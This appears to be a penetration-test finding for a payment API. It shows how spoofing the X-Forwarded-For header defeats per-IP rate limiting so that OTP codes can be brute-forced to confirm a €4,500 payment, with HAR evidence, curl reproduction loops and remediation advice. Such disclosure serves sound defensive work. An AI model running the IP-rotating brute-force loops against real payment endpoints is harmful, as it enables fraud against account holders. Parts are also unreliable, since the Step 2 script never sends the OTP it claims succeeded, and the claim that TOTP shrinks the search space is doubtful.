## Findings

1. **Rate-limit bypass via spoofed `X-Forwarded-For` header enabling OTP brute-force on `POST /api/v2/payments/confirm-otp`**: the Nginx proxy forwards the client-supplied `X-Forwarded-For` value directly to the Go backend (`proxy_set_header X-Forwarded-For $http_x_forwarded_for`) instead of using Cloudflare's trusted `CF-Connecting-IP`. The Go service uses this spoofable header for its failed-attempt counter. By rotating a unique IP address on each request, the attacker presents a different identity to the rate limiter on every guess, effectively removing the 5-attempt limit (section 7.0 states "actual" rate limit policy is "5 failed attempts per unique X-Forwarded-For value").

2. **SCA bypass — successful OTP brute-force in 130 ms**: the HAR captures three sequential requests within 130 ms, each with a different spoofed IP (`192.0.2.15`, `203.0.113.88`, `198.51.100.7`) and sequentially incrementing OTP (`491020`, `491021`, `491022`). The third request returned HTTP 200 with `x-payment-reference: TXN-99182-AA` and `"status": "PAYMENT_EXECUTED"` — PSD2 SCA was defeated and €4,500.00 was released to `MERCHANT_LUXURY_WATCHES_GMBH` from `IBAN_DE89370400440532013000`.

## Evidence

- **HAR entry 1** (`2026-04-08T19:25:01.010Z`, 45 ms): `POST /api/v2/payments/confirm-otp`; `x-forwarded-for: 192.0.2.15`; `otp_code: "491020"`; response HTTP 401 `{"error": "Invalid OTP code provided."}`.
- **HAR entry 2** (`2026-04-08T19:25:01.085Z`, 41 ms): same endpoint; `x-forwarded-for: 203.0.113.88` (different IP); `otp_code: "491021"`; response HTTP 401.
- **HAR entry 3** (`2026-04-08T19:25:01.140Z`, 105 ms): `x-forwarded-for: 198.51.100.7` (third unique IP); `otp_code: "491022"`; response HTTP 200, `x-payment-reference: TXN-99182-AA`, `{"status": "PAYMENT_EXECUTED", "message": "Funds released to clearing."}`.
- **Timing proof**: total elapsed from first to final request is 130 ms (`01.140Z - 01.010Z`). No rate limit block occurred despite 2 prior failures — each failure incremented a separate per-IP counter (counter for `192.0.2.15 = 1`, counter for `203.0.113.88 = 1`, counter for `198.51.100.7 = 1`).
- **Nginx misconfiguration** (section 4.0): `proxy_set_header X-Forwarded-For $http_x_forwarded_for` — the comment explicitly states this should use `CF-Connecting-IP` (the trusted header set by Cloudflare, not forgeable by the client) instead of `$http_x_forwarded_for` (which the client sets).
- **Redis state** (section 6.0): `failed_attempts: 0` in the Redis object — the per-payment attempt counter is also ineffective because the rate limiting key is IP-based, not payment-ID-based.

## Reproduction

Step 1 — confirm that correct `X-Forwarded-For` enforcement blocks after 5 attempts from same IP:

```bash
# 5 failed attempts with consistent IP (should trigger Cloudflare/backend rate limit)
for i in $(seq 1 6); do
  curl -s -X POST "https://api.swiftstream.finance/api/v2/payments/confirm-otp" \
    -H "Authorization: Bearer <TPP_Token>" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 192.0.2.1" \
    -d "{\"payment_id\": \"pay_req_99812A\", \"otp_code\": \"00000$i\"}"
done
```

Expected with fix: 6th request returns 429 Too Many Requests.

Step 2 — rotate `X-Forwarded-For` per attempt to bypass the rate limit:

```bash
for ip_suffix in 15 88 7 42 99 123; do
  curl -s -X POST "https://api.swiftstream.finance/api/v2/payments/confirm-otp" \
    -H "Authorization: Bearer <TPP_Token>" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 198.51.100.$ip_suffix" \
    -d "{\"payment_id\": \"pay_req_99812A\", \"otp_code\": \"49102$ip_suffix\"}"
done
```

Expected secure outcome: Nginx replaces the client-supplied `X-Forwarded-For` with the true `CF-Connecting-IP`; all attempts from the same real IP hit the same counter; lockout triggers after 5 failures.  
Observed vulnerable outcome: each request presents a new IP to the backend rate limiter; all attempts succeed without lockout; correct OTP (`491022`) returns HTTP 200 `PAYMENT_EXECUTED`, `x-payment-reference: TXN-99182-AA`.

## Remediation

- **Use `CF-Connecting-IP` in Nginx**: replace `proxy_set_header X-Forwarded-For $http_x_forwarded_for` with `proxy_set_header X-Real-IP $http_cf_connecting_ip` and enforce rate limiting in the Go backend on `X-Real-IP` (the non-forgeable Cloudflare IP). Alternatively, configure Cloudflare's `CF-Connecting-IP` header as the authoritative source in the Go service.
- **Add per-payment-ID attempt counter**: bind `failed_attempts` in Redis to `payment_id`, not IP address — increment `failed_attempts` in `payment_otp:pay_req_99812A` on every failure. After 5 failures on the same `payment_id`, invalidate the OTP and require re-initiation regardless of IP.
- **Lock OTP to mTLS client certificate identity**: the TPP authenticates via mTLS (section 3.1). Use the mTLS client certificate fingerprint as the rate-limit key instead of any IP-derived header — the certificate cannot be spoofed.
- **Add TOTP/HMAC-based OTP instead of sequential 6-digit**: a TOTP (time-based) OTP window reduces the brute-force search space from 1,000,000 to the codes valid within the current time window (~30 seconds), making high-speed brute-force impractical even without rate limiting.
